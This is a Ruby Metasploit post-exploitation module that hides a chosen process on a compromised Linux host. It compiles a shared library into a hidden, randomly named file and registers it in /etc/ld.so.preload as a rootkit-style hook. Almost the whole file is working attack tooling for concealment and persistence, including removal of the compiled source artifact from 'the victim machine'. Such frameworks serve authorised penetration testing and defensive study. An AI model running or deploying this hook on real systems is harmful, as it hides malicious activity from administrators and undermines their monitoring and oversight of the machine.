##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name'         => 'Linux hide process with LD_PRELOAD',
        'Description'  => %q{
        This module will hide a process with LD_PRELOAD according to process name or command arguments.
        },
        'References'   => [ 'https://github.com/gianlucaborello/libprocesshider' ],
        'License'      => MSF_LICENSE,
        'Author'       => [ 'Green-m <greenm.xxoo[at]gmail.com>'],
        'Platform'     => [ 'linux' ],
        'Targets'      =>
        [
          [ 'Automatic', {} ]
        ]
      )
    )

    register_options [
        OptString.new('CMDLINE', [true, 'The cmdline to filter.']),
        OptString.new('LIBPATH', [true, 'The shared obeject library file path', "/var/tmp/.#{Rex::Text.rand_text_alpha(8..12)}" ])
    ]

    register_advanced_options [
      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])
    ]
  end

  def run
    @filtered_cmdline = datastore['CMDLINE']
    @clean_up = ""

    print_status("Checking system requirement...")
    unless check_requirement
      print_error("Something goes wrong!")
      return
    end

    print_good("All requirement is good.")

    write_files

    compile_code

    if install_hook
      print_good("Install the hook to hide process successful!")
    else
      print_error("Install the hook failed.")
      cmd_exec("rm -f #{lib_path}") # Clean it.
    end

    print_good("To uninstall the hook, run command below in meterpreter.")
    print_line(clean_up)
  end

  def check_requirement
    unless has_gcc?
      print_error("Gcc not found.")
      return false
    end

    unless check_priv
      return false
    end

    true
  end

  #
  # Check if the ld.so.preload is accessiable.
  #
  def check_priv
    unless file_exist?(preload_path) && writable?(preload_path) or writable?('/etc/')
      print_error("No privilege to access #{preload_path}")
      return false
    end

    true
  end

  #
  # Writing source code to a temp file to wait to be compiled.
  #
  def write_files
    vprint_status("Writing c code to #{artifact}")
    write_file(artifact, code_template)

    fail_with(Failure::NoAccess, "Unable to write code to #{artifact}") unless file_exist?(artifact)
  end

  ##
  # Compile the code to so file.
  ##
  def compile_code
    code = "gcc -Wall -fPIC -shared -o #{lib_path} #{artifact} -ldl"

    vprint_status("Compile c code to #{lib_path} as a shared object library file ")

    cmd_exec(code)
    cmd_exec("rm -f #{artifact}") # Clean the artifact

    # Check result of the compilation phase
    fail_with(Failure::BadConfig, 'Unable to compile the code with gcc...') unless file_exist?(lib_path)
  end

  #
  # To install the hook in ld.so.preload
  #
  def install_hook
    vprint_status("Installing the process hider hook...")
    cmd_exec("echo #{lib_path} >> #{preload_path}")

    # Check the result.
    begin
      unless cmd_exec("grep -q #{lib_path.inspect} #{preload_path} && echo true").to_s.include?('true') # Check if contain the lib_path
        return false
      end
    rescue Exception => e
      vprint_line(e)
      return false
    end

    true
  end

  #
  # Clean the hook in ld.so.preload and remove the shared object file.
  #
  def clean_up
    cmds  = %Q{execute -H -f sed -a "-i -e \'/#{lib_path.gsub('/', '\/')}/d\' #{preload_path}"\n}
    cmds << "rm #{lib_path}"
  end

  #
  # The source file.
  #
  def code_template
    template = File.read(File.join(Msf::Config.data_directory, 'post', 'process_hider', 'process_hider.erb'))
    ERB.new(template).result(binding)
  end

  def writable_dir
    datastore['WritableDir']
  end

  #
  # The temporary code file left on the victim machine.
  #
  def artifact
    @artifact ||= "#{writable_dir}/#{Rex::Text.rand_text_alpha(6..12)}.c"
  end

  def lib_path
    datastore['LIBPATH']
  end

  def preload_path
    '/etc/ld.so.preload'
  end
end
